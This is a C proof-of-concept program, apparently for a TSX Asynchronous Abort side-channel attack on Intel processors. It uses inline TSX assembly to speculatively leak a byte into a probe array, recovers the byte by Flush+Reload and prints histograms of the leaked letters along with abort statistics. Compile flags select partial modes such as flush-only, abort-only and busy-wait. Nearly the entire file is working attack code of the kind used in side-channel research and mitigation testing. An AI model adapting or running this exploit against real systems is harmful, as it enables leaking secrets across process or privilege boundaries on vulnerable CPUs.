#define _GNU_SOURCE 1

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>
#include "cacheutils.h"
//#define WHILE_ONLY /* NOT DEPENDENT ON ANY FLAG */
//#define FLUSH_ONLY /* NORMAL FLAG AND FLUSH RELOAD ONLY FLAGMUST BE OFF FOR THIS TO WORK, */
#define FLUSH_RELOAD_ONLY /* NORMAL FLAG AND FLUSH ONLY MUST BE OFF FOR THIS TO WORK */

//#define NORMAL   /* NOT DEPENDENT ON ANY FLAG */
//#define ONLY_ABORT /* NORMAL FLAG MUST BE SET FOR THIS TO WORK */

int print_once = 0;
#define FROM 'A'
#define TO   'Z'
//#define NORMAL
//void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }

char __attribute__((aligned(4096))) mem[256 * 4096];
char __attribute__((aligned(64))) mem2[32*4096];
char __attribute__((aligned(4096))) mapping[4096];
size_t hist[256];
volatile long long aborted = 0;
volatile long long not_aborted = 0;
volatile int temp_cnter = 0;
#define CNTER_LIMIT 1000
void recover(void);
volatile bool abort_flag = 0;


volatile long long temp_cnt = 0;
int main(int argc, char *argv[])
{
  if(!has_tsx()) {
    printf("[!] Variant 2 requires a CPU with Intel TSX support!\n");
  }
    
  /* Initialize and flush LUT */
  memset(mem, 0, sizeof(mem));
  memset(mem2, 0, sizeof(mem2));

//  for (size_t i = 0; i < 256; i++) {
//    flush(mem + i * 4096);
//  }
  
  /* Initialize mapping */
  	memset(mapping, 0, 4096);

  // Calculate Flush+Reload threshold
//  CACHE_MISS = detect_flush_reload_threshold();
  fprintf(stderr, "[+] Flush+Reload Threshold: %u\n", (unsigned int)CACHE_MISS);

#ifdef WHILE_ONLY
  if (!print_once) {
	  print_once = 1;
	  printf("Busy Wait {while(1)} loop...\n");
  }
  while(1);
#endif

  while (true) {
#ifndef NORMAL
#if defined(FLUSH_ONLY) || defined (FLUSH_RELOAD_ONLY)
	  recover();
#endif
#else
#ifndef ONLY_ABORT
	  if (!print_once) {
		  print_once = 1;
		  printf("TAA Attack in Progress...\n");
	  }
	    __asm__ __volatile__ (
	    		 	 	 	  "movq %3, %%rdi;"				// Move mapping (leak source) to "rdi"
	    					  "clflush (%%rdi);"			// Flush Mapping array
							  "movq %4, %%rsi;"				// Move mem (Timings / Flush+Reload Channel) to "rsi"
//							  "clflush (%%rsi);"			// Flush Timing Channel

	    					  "xbegin 2f;"				// Start TSX Transaction
	    					  "movq (%%rdi), %%rax;"		// Leak a single byte from mapping (leak source) and speculatively load in rax register
	    					  "shl $12, %%rax;"				// Multiply leak source with 4096 256x4096, i.e. 4096 entries apart each byte
	    					  "andq $0xff000, %%rax;"		// We are only interested in 256 bytes uppper than 4096
	    					  "movq (%%rax, %%rsi), %%rax;"	// Use the leak byte as a index to load into Timing (F+R) Channel. Its footprint will be left on cache
	    					  "xend;"						// End TSX Transaction

							  "movq %1, %%rcx;"
	  	  	  	  	  	  	  "incq %%rcx;"
							  "movq %%rcx, %1;"
				  	  	  	  "movq $0, %0;"
	  	  	  	  	  	  	  "jmp 3f;"
							  "2:"						//
							  "movq %2, %%rdx;"
				  	  	  	  "incq %%rdx;"
							  "movq %%rdx, %2;"
	    					  "movq $1, %0;"
				  	  	  	  "3:;"
	    					  : "=g"(abort_flag), "=g"(aborted), "=g"(not_aborted) : "r" (mapping), "r" (mem), "r"(aborted), "r"(not_aborted) : "rcx", "rdx"
	    );
#else
		  if (!print_once) {
			  print_once = 1;
			  printf("TSX continuously aborting...\n");
		  }
	    __asm__ __volatile__ (
	    		 	 	 	  "movq %0, %%rdi;"				// Move mapping (leak source) to "rdi"
	    					  "clflush (%%rdi);"			// Flush Mapping array
	    					  "xbegin 2f;"				// Start TSX Transaction
	    					  "movq (%%rdi), %%rax;"		// Leak a single byte from mapping (leak source) and speculatively load in rax register
	    					  "xend;"						// End TSX Transaction
							  "2:"						//
	    					  :  : "r" (mapping) : "rcx", "rdx"
	    );
#endif
    /*
     * We will only have foot print in cache when transaction is aborted
     */
#ifndef ONLY_ABORT
    if (/*abort_flag*/1) {
    	recover();
    }
#endif
    /* Recover through probe mem array */
    recover();
#endif
  }

  return 0;
}

int timeout = 0;
volatile long long not_update = 0;

/*
 *
 */
void recover(void) {

#ifdef NORMAL
    /* Recover value from cache and update histogram */
    bool update = false;
    for (size_t i = FROM; i <= TO; i++) {
      if (flush_reload((char*) mem + 4096 * i)) {
        hist[i]++;
        update = true;
      }
    }

    if (update == true /*|| (++not_update > 1000000)*/)
    {
    	not_update = 0;
        printf("\x1b[2J");

        int max = 1;

        if (timeout++ > 200)
        {
        	timeout = 0;

			for (int i = FROM; i <= TO; i++) {
			  if (hist[i] > max) {
				max = hist[i];
			  }
			}

			for (int i = FROM; i <= TO; i++) {
				printf("%c: (%4u) ", i, (unsigned int)hist[i]);
				for (int j = 0; j < hist[i] * 60 / max; j++) {
				  printf("#");
				}
				printf("\n");
			}
			printf("Aborted_Count: %lld\n", aborted);
			printf("Not_Aborted_Count: %lld\n", not_aborted);
			printf("Percentage Abort => %f\n", (float) (aborted * 100) / not_aborted);

			fflush(stdout);
        }
    }
#else
#ifdef FLUSH_ONLY
        /* Recover value from cache and update histogram */
        bool update = false;
		if (!print_once) {
		  print_once = 1;
		  printf("Continuously Flushing L1 Cache...\n");
		}
        for (size_t i = FROM; i <= TO; i++) {
          if (flush_only((char*) mem + 4096 * i)) {
            hist[i]++;
            update = true;
          }
        }
#endif
#ifdef FLUSH_RELOAD_ONLY
        /* Recover value from cache and update histogram */
        bool update = false;
		if (!print_once) {
		  print_once = 1;
		  printf("Continuously Flushing & Reloading L1 Cache...\n");
		}
        for (size_t i = FROM; i <= TO; i++) {
          if (flush_reload((char*) mem + 4096 * i)) {
            hist[i]++;
            update = true;
          }
        }
#endif
#endif
}
